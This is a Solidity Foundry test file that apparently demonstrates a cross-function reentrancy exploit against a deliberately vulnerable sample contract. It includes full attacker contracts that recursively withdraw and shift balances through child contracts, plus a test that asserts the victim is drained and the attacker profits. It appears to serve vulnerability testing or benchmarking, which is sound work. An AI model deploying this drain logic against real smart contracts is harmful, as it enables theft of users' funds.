// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_cross_function.sol";

contract AttackerChild {
    Reentrancy_cross_function public victim;
    address public owner;
    uint256 public withdrawCalled;

    constructor(address _victim, address _owner) payable {
        victim = Reentrancy_cross_function(_victim);
        owner = _owner;
    }

    function withdraw() public {
        withdrawCalled++;
        victim.withdrawBalance();
    }

    fallback() external payable {
        payable(owner).transfer(address(this).balance);
    }
}

contract AttackerParent {
    Reentrancy_cross_function public victim;
    uint256 public count;
    address[] public children;

    constructor(address payable _victim) {
        victim = Reentrancy_cross_function(_victim);
    }

    function deposit() external payable {
        victim.deposit{value: msg.value}();
    }

    function withdraw() external {
        victim.withdrawBalance();
    }

    fallback() external payable {
        if (count < 2) {
            count++;
            // Create and fund a new child
            AttackerChild newChild = new AttackerChild{value: address(this).balance}(
                address(victim),
                address(this)
            );
            children.push(address(newChild));
            victim.deposit{value: address(this).balance}();
            newChild.withdraw();
        }
    }

    receive() external payable {
        this.drain();
    }

    function drain() external {
        for (uint256 i = 0; i < children.length; i++) {
            payable(children[i]).call(abi.encodeWithSignature("withdraw()"));
        }
    }

    function transferAllBalanceToChild() external {
        victim.transfer(children[0], victim.getBalance(address(this)));
    }
}

contract ReentrancyTest is Test {
    Reentrancy_cross_function public vuln;
    AttackerParent public attacker;
    AttackerChild child;

    function setUp() public {
        vuln = new Reentrancy_cross_function();
        attacker = new AttackerParent(payable(address(vuln)));
        vm.deal(address(attacker), 10 ether);
        vm.deal(address(this), 10 ether);
    }

    function testReentrancy() public {
        // Initial deposit from attacker
        attacker.deposit{value: 1 ether}();
        vm.warp(block.timestamp + 2 days);

        // Capture pre-attack state
        uint256 vulnBalanceBefore = address(vuln).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        
        console2.log("--- BEFORE-Trigger State ---");
        console2.log("Vulnerable contract balance (ETH):", vulnBalanceBefore);
        console2.log("Attacker contract balance (ETH):", attackerBalanceBefore);

        console2.log("--- Trigger Attack ---");
        // Execute reentrancy attack
        attacker.withdraw();
        attacker.drain();

        // Capture post-attack state
        uint256 vulnBalanceAfter = address(vuln).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        
        console2.log("--- AFTER-Trigger State ---");
        console2.log("Vulnerable contract balance (ETH):", vulnBalanceAfter);
        console2.log("Attacker contract balance (ETH):", attackerBalanceAfter);

        // Calculate amount stolen
        uint256 stolenAmount = vulnBalanceBefore - vulnBalanceAfter;
        uint256 attackerProfit = attackerBalanceAfter - attackerBalanceBefore;
        
        console2.log("Vulnerable contract loss (ETH):", stolenAmount);
        console2.log("Attacker profit (ETH):", attackerProfit);

        // Determine vulnerability existence
        bool fundsDrained = vulnBalanceAfter == 0;
        bool attackerBenefited = attackerProfit == stolenAmount;

        // Final verdict based on state changes
        if (fundsDrained && attackerBenefited) {
            console2.log("Vulnerability Exists: Vulnerable contract drained with matching profit");
        } else {
            console2.log("Vulnerability not Exist: Attack didn't alter balances as expected");
        }

        // Maintain existing test assertions
        assertEq(vulnBalanceAfter, 0, "Contract funds should be drained");
        assertGt(attackerBalanceAfter, vulnBalanceBefore, "Attacker should profit from attack");
    }
}